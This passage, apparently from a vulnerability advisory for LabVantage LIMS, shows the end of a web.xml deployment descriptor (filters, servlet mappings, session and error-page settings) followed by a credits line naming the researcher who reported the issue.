            <param-name>enabled</param-name>
            <!-- Change to Y to enable filtering of normal LIMS requests (by default will only allow portal traffic and will redirect anything else to the portal)-->
            <param-value>N</param-value>
        </init-param>
        <init-param>
            <param-name>allowed</param-name>
            <param-value>(?i)*portal*;(?i)*stellar*;(?i)*web-stellar*</param-value>
        </init-param>
        <init-param>
            <param-name>redirect</param-name>
            <param-value>portal</param-value>
        </init-param>
        <init-param>
            <param-name>code</param-name>
            <param-value>404</param-value>
        </init-param>
        <init-param>
            <param-name>message</param-name>
            <param-value>Resource Not Found</param-value>
        </init-param>
        <init-param>
            <param-name>websocketcsrf</param-name>
            <!-- Change to N for localhost development so that websocket csrf token is not required -->
            <param-value>Y</param-value>
        </init-param>
    </filter>
    <filter-mapping>
        <filter-name>PortalRequest</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>PortalRequest</filter-name>
        <url-pattern>/portal/*</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>PortalRequest</filter-name>
        <url-pattern>/stellar/*</url-pattern>
    </filter-mapping>
    <!-- End portal -->
    <servlet>
        <display-name>StellarController</display-name>
        <servlet-name>StellarController</servlet-name>
        <servlet-class>com.labvantage.stellar.servlet.StellarController</servlet-class>
        <init-param>
            <!-- For local development change this to Y to allow cross origin requests from localhost and less secure cookies -->
            <param-name>devmode</param-name>
            <param-value>N</param-value>
        </init-param>
        <load-on-startup>1</load-on-startup>
    </servlet>
    <servlet>
        <display-name>RequestController</display-name>
        <servlet-name>RequestController</servlet-name>
        <servlet-class>com.labvantage.sapphire.servlet.RequestController</servlet-class>
    </servlet>
    <servlet>
        <display-name>RestController</display-name>
        <servlet-name>RestController</servlet-name>
        <servlet-class>com.labvantage.sapphire.servlet.RestController</servlet-class>
    </servlet>
    <servlet>
        <display-name>NotificationController</display-name>
        <servlet-name>NotificationController</servlet-name>
        <servlet-class>com.labvantage.sapphire.servlet.NotificationController</servlet-class>
        <async-supported>true</async-supported>
    </servlet>
    <servlet>
        <display-name>WebServices</display-name>
        <servlet-name>WebServices</servlet-name>
        <servlet-class>org.apache.axis.transport.http.AxisServlet</servlet-class>
    </servlet>
    <!-- UNCOMMENT IF ON JBOSS YOU WANT SERVICE TO RUN USING APACHE CXF -->
    <!--<servlet>-->
    <!--<display-name>SapphireBasicWS</display-name>-->
    <!--<servlet-name>SapphireBasicWS</servlet-name>-->
    <!--<servlet-class>com.labvantage.sapphire.webservices.SapphireBasicWS</servlet-class>-->
    <!--</servlet>-->
    <servlet-mapping>
        <servlet-name>SapphireController</servlet-name>
        <url-pattern>/sc</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>StellarController</servlet-name>
        <url-pattern>/stellar</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>RequestController</servlet-name>
        <url-pattern>/rc/*</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>RestController</servlet-name>
        <url-pattern>/rest/*</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>NotificationController</servlet-name>
        <url-pattern>/nc</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>WebServices</servlet-name>
        <url-pattern>/services/*</url-pattern>
    </servlet-mapping>
    <!-- UNCOMMENT IF ON JBOSS YOU WANT SERVICE TO RUN USING APACHE CXF -->
    <!--<servlet-mapping>-->
    <!--<servlet-name>SapphireBasicWS</servlet-name>-->
    <!--<url-pattern>/services/SapphireBasicWS</url-pattern>-->
    <!--</servlet-mapping>-->
    <session-config>
        <session-timeout>30</session-timeout>
        <!-- UNCOMMENT ON JBOSS AND WEBLOGIC TO MAKE JSESSION ID SECURE -->
        <!--        <cookie-config>-->
        <!--            <http-only>true</http-only>-->
        <!--            <secure>true</secure>-->
        <!--        </cookie-config>-->
    </session-config>
    <mime-mapping>
        <extension>xsd</extension>
        <mime-type>text/xml</mime-type>
    </mime-mapping>
    <mime-mapping>
        <extension>wsdl</extension>
        <mime-type>text/xml</mime-type>
    </mime-mapping>
    <welcome-file-list>
        <welcome-file>index.html</welcome-file>
    </welcome-file-list>
    <error-page>
        <exception-type>com.labvantage.sapphire.servlet.command.LoginException</exception-type>
        <location>/logon.jsp</location>
    </error-page>
    <error-page>
        <exception-type>com.labvantage.sapphire.servlet.command.CommandException</exception-type>
        <location>/WEB-CORE/error/command.jsp</location>
    </error-page>
    <error-page>
        <exception-type>com.labvantage.sapphire.servlet.command.PasswordException</exception-type>
        <location>/WEB-CORE/error/password.jsp</location>
    </error-page>
    <error-page>
        <exception-type>javax.servlet.ServletException</exception-type>
        <location>/WEB-CORE/error/error.jsp</location>
    </error-page>
    <login-config>
        <auth-method>BASIC</auth-method>
        <realm-name />
    </login-config>
</web-app>

````

# Credits
This vulnerability was discovered by Nirmala Sriramulu of Henkel Cyber Security Team.
